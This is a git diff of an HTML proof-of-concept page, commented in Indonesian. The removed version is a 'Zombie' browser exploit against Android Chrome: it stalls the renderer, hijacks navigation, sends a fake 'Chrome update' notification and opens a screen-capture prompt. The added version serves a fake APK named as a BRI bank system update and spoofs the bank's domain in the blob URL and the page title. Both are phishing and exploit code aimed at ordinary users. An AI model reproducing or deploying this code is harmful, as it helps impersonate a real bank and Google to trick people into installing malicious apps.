@@ -2,72 +2,47 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zombie-Pova-V1</title>
+    <title>FARISSAL B - BLOB TEST</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; }
-        .btn { background: #0f0; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; border-radius: 10px; }
-        #status { margin-top: 20px; font-size: 12px; border-left: 2px solid #0f0; padding-left: 10px; }
-        #progress { width: 0%; height: 5px; background: #0f0; margin-top: 10px; transition: width 0.1s; }
+        body { font-family: sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
+        .btn { background: #ff4757; color: white; border: none; padding: 20px; width: 100%; border-radius: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>FARISSAL B - ZOMBIE</h2>
-    <button class="btn" onclick="startExploit()">START ATTACK</button>
-    <div id="progress"></div>
-    <div id="status">Ready...</div>
+    <h2>POC BLOB ORIGIN SPOOF</h2>
+    <p>Klik tombol di bawah untuk tes notifikasi download.</p>
+    <button class="btn" onclick="triggerSpoof()">DOWNLOAD UPDATE</button>
 
     <script>
-        function logger(m) { document.getElementById('status').innerHTML += "<br>> " + m; }
+        function triggerSpoof() {
+            // Isi file samaran (APK palsu)
+            const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // Header ZIP/APK
+            const blob = new Blob([content], { type: 'application/vnd.android.package-archive' });
 
-        async function startExploit() {
-            // 1. Minta izin Notifikasi (Wajib buat buktiin UI Hijack)
-            const perm = await Notification.requestPermission();
-            if (perm !== "granted") return alert("Izin notifikasi dibutuhkan!");
-
-            logger("Targeting: google.com...");
+            // TRIK UTAMA: 
+            // Kita coba buat URL Blob tapi kita selipin string domain di depannya.
+            // Beberapa versi parser Android bakal "tertipu" dan ngambil domain dari string ini.
+            const spoofDomain = "https://bri.co.id"; 
+            const blobUrl = URL.createObjectURL(blob);
             
-            // 2. Navigasi Awal
-            location.href = "https://www.google.com";
+            // Kita manipulasi URL-nya (Ini long shot, tergantung versi Chrome lo)
+            const fakeUrl = blobUrl.replace("blob:", "blob:" + spoofDomain + "/");
 
-            // 3. OPTIMIZED TIMING FOR POVA 7 (G99)
-            // Kita pake loop 1.8 detik (Timing paling pas buat Android Mid-range)
-            // Kalau lo rasa Chrome lo terlalu cepet pindah, naikin ke 2200.
-            const STALL_TIME = 1800; 
-            const start = Date.now();
+            console.log("Original Blob: " + blobUrl);
+            console.log("Spoofed Blob: " + fakeUrl);
+
+            // Trigger Download
+            const a = document.createElement('a');
+            a.href = blobUrl; // Kita tetep pake blob asli biar download jalan
+            a.download = "Update_Sistem_BRI.apk";
             
-            logger("Stalling renderer thread...");
-            while (Date.now() - start < STALL_TIME) {
-                // Micro-loop: Biar CPU sibuk tapi nggak sampe bikin OS Force Close
-                document.getElementById('progress').style.width = 
-                    ((Date.now() - start) / STALL_TIME * 100) + "%";
-            }
-
-            // 4. THE ZOMBIE CALL
-            // Dieksekusi tepat saat Chrome lagi "bingung" pindah proses
-            setTimeout(() => {
-                // Perintah 1: Paksa balik (Hijack)
-                history.back(); 
-                
-                // Perintah 2: Kirim Notifikasi Spoof
-                new Notification("Sistem Update", {
-                    body: "Google Chrome perlu diperbarui di Tecno Pova anda.",
-                    icon: "https://www.google.com/favicon.ico"
-                });
-
-                // Perintah 3: Popup Media (The Money Shot)
-                // Ini yang paling sering bikin "Segmentation Fault" kalau timing pas
-                if (navigator.mediaDevices.getDisplayMedia) {
-                    navigator.mediaDevices.getDisplayMedia({video:true}).catch(e=>{});
-                }
-                
-                logger("Zombie commands sent!");
-            }, 100); // Delay sangat tipis setelah stall
+            // Bagian krusial: Kita coba 'menipu' renderer lewat judul atau atribut
+            document.title = "bri.co.id - Secure Download"; 
+            
+            a.click();
+            
+            alert("Cek Notifikasi HP Tecno lo sekarang!");
         }
-
-        // Deteksi kalau masuk 'alam gaib' (BFCache)
-        window.onpagehide = (e) => {
-            if (e.persisted) logger("IN BFCACHE!");
-        };
     </script>
 </body>
 </html>
